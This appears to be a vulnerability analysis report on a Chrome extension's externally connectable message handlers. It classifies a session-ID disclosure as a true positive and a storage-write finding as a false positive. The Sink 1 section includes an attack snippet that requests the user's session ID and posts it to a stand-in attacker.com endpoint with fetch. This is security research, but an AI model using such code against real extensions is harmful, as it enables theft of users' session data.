# CoCo Analysis: choeplekfpknnlolmcmgpbblkilnengn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 total
  - 1 TRUE POSITIVE: storage_local_get_source → sendResponseExternal_sink (information disclosure)
  - 2 FALSE POSITIVE: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (incomplete storage exploitation)

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink [TRUE POSITIVE]

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/choeplekfpknnlolmcmgpbblkilnengn/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'};
Line 1042: if(res.userInfo != undefined){
Line 1043: sendResponse({sessionID: res.userInfo.UserId});

**Code:**

```javascript
// Background script - External message handler (lines 1034-1055)
chrome.runtime.onMessageExternal.addListener( // ← Externally connectable
    function(request, sender, sendResponse) {
        if (request) {
            if (request.message) {
                if (request.message == "version") {
                    sendResponse({version: 1.0});
                } else if(request.message == "sessionID"){ // ← Attacker can request this
                    chrome.storage.local.get('userInfo', function(res) { // ← Read from storage
                        if(res.userInfo != undefined){
                            sendResponse({sessionID: res.userInfo.UserId}); // ← Send to external caller
                        } else {
                            sendResponse({sessionID: 0});
                        }
                    });
                } else {
                    sendResponse({sessionID: 0});
                }
            }
        }
        return true;
    });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker's malicious webpage (must be on whitelisted domain per manifest.json)
// Manifest allows: dropshipsa.com, dropship.ulspan.com, aliexpress.com, s.salla.sa, localhost:8080

// Request the user's session ID from storage
chrome.runtime.sendMessage(
    'extension_id_here', // choeplekfpknnlolmcmgpbblkilnengn
    {message: "sessionID"},
    function(response) {
        console.log("Stolen session ID:", response.sessionID);
        // Attacker can now exfiltrate the user's session ID
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({sessionID: response.sessionID})
        });
    }
);
```

**Impact:** Information disclosure - External websites (including those on the whitelist like aliexpress.com which hosts user-generated content) can request and receive the user's session ID (UserId) stored in chrome.storage. This allows an attacker to steal sensitive user authentication data. Even though externally_connectable restricts which domains can send messages, several of the whitelisted domains (like aliexpress.com) could potentially host attacker-controlled content, making this exploitable.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink [FALSE POSITIVE]

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/choeplekfpknnlolmcmgpbblkilnengn/opgen_generated_files/bg.js
Line 1059: if (request.message && request.message === "DoLogin" && request.userData) {
Line 1065: setCookie('sessionID',userData.userId,10000);
Line 1070: var userInfo = JSON.parse(jsonString);
Line 1076: chrome.storage.local.set({'userInfo': userInfo});

**Code:**

```javascript
// Background script - External message handler for login (lines 1057-1083)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        if (request.message && request.message === "DoLogin" && request.userData) {
            var userData = request.userData; // ← Attacker-controlled
            setCookie('sessionID',userData.userId,10000);
            var UserId = userData.userId;
            var obj = new Object();
            obj.UserId = UserId;
            var jsonString = JSON.stringify(obj);
            var userInfo = JSON.parse(jsonString);
            clearLocalStorage();
            chrome.storage.local.remove('userInfo', function() {
                console.log('Cookie removed');
            });
            chrome.storage.local.set({'userInfo': userInfo}); // ← Store attacker data
            sendResponse({ success: true });
        }
        return true;
    }
);
```

**Classification:** FALSE POSITIVE

**Reason:** While an external attacker can poison the storage with arbitrary userData.userId values, this is an incomplete storage exploitation. The attacker can write to storage, and as shown in Sink 1, the stored value can be read back via the "sessionID" message. However, this forms a complete chain: attacker writes data → attacker reads it back. This is essentially the attacker communicating with themselves through the extension's storage, which doesn't provide any exploitable impact beyond what they already control. The storage serves as a pass-through mechanism but doesn't grant access to any privileged operations or sensitive data that the attacker doesn't already have.
